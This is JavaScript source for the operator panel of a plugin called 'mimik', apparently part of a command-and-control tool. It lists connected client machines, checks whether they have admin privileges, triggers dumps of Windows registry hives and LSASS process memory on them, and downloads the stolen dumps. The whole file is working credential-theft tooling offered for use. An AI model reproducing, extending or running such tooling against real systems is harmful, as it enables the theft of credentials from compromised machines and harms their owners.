const PLUGIN_ID = "mimik";

let currentClientId = "";

const $ = (id) => document.getElementById(id);

async function rpc(method, params = {}) {
  const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, params }),
  });
  const body = await res.json().catch(() => ({}));
  if (!body.ok) throw new Error(body.error || `rpc ${method} failed: ${res.status}`);
  return body.result;
}

async function sendEvent(event, payload = {}) {
  if (!currentClientId) {
    log("no client id set", "err");
    return;
  }
  await fetch(`/api/clients/${currentClientId}/plugins/${PLUGIN_ID}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
}

function setBadge(state) {
  const b = $("statusBadge");
  b.className = "badge " + (state || "idle");
  b.textContent = state || "idle";
}

function setPriv(admin, note) {
  const el = $("privRow");
  if (note) {
    el.className = "priv unknown";
    el.textContent = "privileges: " + note;
  } else if (admin) {
    el.className = "priv admin";
    el.textContent = "privileges: admin (can dump)";
  } else {
    el.className = "priv noadmin";
    el.textContent = "privileges: NOT admin — dumping will fail";
  }
}

function fmtSize(n) {
  if (n == null) return "?";
  if (n < 1024) return n + " B";
  if (n < 1024 * 1024) return (n / 1024).toFixed(1) + " KB";
  return (n / 1024 / 1024).toFixed(1) + " MB";
}

function log(text, kind = "") {
  // reused as a lightweight status line; dump table is the real output
  const el = $("statusBadge");
  if (kind === "err") {
    el.className = "badge error";
    el.textContent = text.slice(0, 40);
  }
}

async function refreshDumps() {
  if (!currentClientId) return;
  try {
    const rows = await rpc("list_dumps", { clientId: currentClientId });
    const el = $("dumpList");
    if (!rows.length) {
      el.className = "dumps empty";
      el.textContent = "nothing dumped yet";
      return;
    }
    el.className = "dumps";
    el.innerHTML = "";
    rows.forEach((r) => {
      const row = document.createElement("div");
      row.className = "dump-row";

      const kind = document.createElement("span");
      kind.className = "kind " + r.kind;
      kind.textContent = r.kind;

      const info = document.createElement("div");
      info.className = "info";
      const name = document.createElement("div");
      name.className = "name";
      name.textContent = r.name;
      const meta = document.createElement("div");
      meta.className = "meta";
      meta.textContent = fmtSize(r.size);
      if (r.path) {
        const code = document.createElement("code");
        code.textContent = "  " + r.path;
        meta.appendChild(code);
      }
      info.appendChild(name);
      info.appendChild(meta);

      row.appendChild(kind);
      row.appendChild(info);

      if (r.inline) {
        const btn = document.createElement("a");
        btn.className = "btn";
        btn.textContent = "download";
        btn.href = "#";
        btn.onclick = (e) => {
          e.preventDefault();
          downloadDump(r.id, r.name);
        };
        row.appendChild(btn);
      }

      el.appendChild(row);
    });
  } catch (e) {
    log("list failed: " + e.message, "err");
  }
}

async function downloadDump(id, name) {
  try {
    const res = await rpc("get_dump", { id });
    const bin = atob(res.data);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const blob = new Blob([bytes], { type: "application/octet-stream" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    a.click();
    URL.revokeObjectURL(url);
  } catch (e) {
    alert(e.message);
  }
}

function handleStream(data) {
  if (!data) return;
  const evt = data.event;
  const p = data.payload ?? data;
  if (p && p.clientId && p.clientId !== currentClientId) return;

  switch (evt) {
    case "status":
      setBadge(p.state);
      break;
    case "hive":
      refreshDumps();
      break;
    case "lsass":
      refreshDumps();
      break;
    case "priv":
      setPriv(p.admin, p.note);
      break;
    case "error":
      log(p.message || "error", "err");
      break;
    default:
      break;
  }
}

function connectStream() {
  const es = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  ["status", "hive", "lsass", "priv", "error", "pong"].forEach((ch) => {
    es.addEventListener(ch, (ev) => {
      let data;
      try { data = JSON.parse(ev.data); } catch { data = null; }
      if (data != null) handleStream({ event: ch, payload: data });
    });
  });
  es.onerror = () => {
    es.close();
    setTimeout(connectStream, 3000);
  };
}

async function refreshClients() {
  try {
    const clients = await rpc("list_clients");
    const dl = $("clientsList");
    dl.innerHTML = "";
    clients.forEach((c) => {
      const o = document.createElement("option");
      o.value = c.clientId;
      dl.appendChild(o);
    });
    $("clientCount").textContent = clients.length ? `${clients.length} client(s) seen` : "no clients seen yet";
    if (clients.length && !currentClientId) {
      currentClientId = clients[0].clientId;
      $("clientId").value = currentClientId;
      refreshDumps();
    }
  } catch (e) {}
}

function bind() {
  $("clientId").addEventListener("change", (e) => {
    currentClientId = e.target.value.trim();
    refreshDumps();
  });
  $("refreshClients").addEventListener("click", refreshClients);
  $("checkPriv").addEventListener("click", () => sendEvent("priv"));
  $("dumpHives").addEventListener("click", () => sendEvent("dump_hives"));
  $("dumpLsass").addEventListener("click", () => sendEvent("dump_lsass"));
  $("dumpAll").addEventListener("click", () => sendEvent("dump_all"));
}

bind();
connectStream();
refreshClients();
